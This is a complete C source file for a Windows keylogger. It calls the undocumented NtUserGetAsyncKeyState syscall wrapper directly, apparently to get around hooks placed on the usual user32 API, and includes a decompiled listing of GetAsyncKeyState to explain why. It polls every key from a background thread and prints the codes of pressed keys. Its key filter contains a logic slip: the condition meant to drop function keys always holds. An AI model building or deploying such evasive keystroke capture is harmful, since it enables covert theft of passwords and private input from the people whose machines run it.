#include <windows.h>
#include <stdio.h>

#define MONITOR_TIME   20000 // monitor keyboard keystrokes for 20 seconds

// https://doxygen.reactos.org/d4/d49/win32ss_2user_2ntuser_2keyboard_8c.html#ab695305553e9ff550bcefb0e5acec9de
extern SHORT NtUserGetAsyncKeyState(
	IN		INT		vKey
);

VOID KeyboardClicksLogger() {
    SHORT                       state                       = NULL;
    HMODULE		                hWin32uModule			    = NULL;

	// Load Win32u.dll to the current process so that GetModuleHandle will work
	if (LoadLibraryA("WIN32U.DLL") == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return;
	}

    printf("[*] Output: ");

	while (TRUE) {
        // Sleep for better performance
        // We dont need to query every clock cycle so lets sleep for 10 milliseconds
        Sleep(10);
        
        // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        // Reversed GetAsyncKeyState function:
        /*
            SHORT __stdcall GetAsyncKeyState(int vKey) {
                SHORT v1;               // di
                unsigned int v2;        // ebx
                unsigned __int64 v3;    // r9
                
                v1 = 0;
                v2 = vKey;
                if ( *(_QWORD *)(__readgsqword(0x30u) + 120) || NtUserGetThreadState(14i64) ) {
                    if ( v2 - 1 <= 1 && *(_DWORD *)(gpsi + 1988) )
                        v2 ^= 3u;

                    if ( v2 < 0x20 ) {
                        v3 = __readgsqword(0x30u);
                        if ( *(_DWORD *)(v3 + 2172) == *(_DWORD *)(gpsi + 6988) && !((unsigned __int8)(1 << (v2 & 7)) & *(_BYTE *)(((unsigned __int64)(unsigned __int8)v2 >> 3) + v3 + 2184)) ) {
                            return (*(_BYTE *)(((unsigned __int64)(unsigned __int8)v2 >> 2) + v3 + 2176) & (unsigned __int8)(1 << 2 * (v2 & 3))) != 0 ? 0x8000 : 0;
                        }
                    }
                    v1 = NtUserGetAsyncKeyState(v2);
                }
                return v1;
            }
        */
        // Range from 0x20-0xFE due to us trying to avoid the previous checks
		for (int i = 33; i < 255; i++) {
            // Get state
            state = (SHORT)NtUserGetAsyncKeyState((DWORD)i);

			// https://msdn.microsoft.com/en-us/library/windows/desktop/ms646293(v=vs.85).aspx
            // 1        = press
            // -32767   = held down
            if (state == 1 || state == -32767) {
                // Remove mouse inputs (0x01-0x07), fn keys (0x70-0x8F)
                if (( 7 < i) && ( 120 < i || i < 143))
				    printf("\\x%02X", i);
            }
		}
	}
    
    return;
}

int main() {
    HANDLE  hThread         = NULL;
    DWORD   dwThreadId      = NULL;

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Is Created To Monitor Keyboard Clicks For %d Seconds\n", dwThreadId, (MONITOR_TIME / 1000));
        WaitForSingleObject(hThread, MONITOR_TIME);
    }

    return 0;
}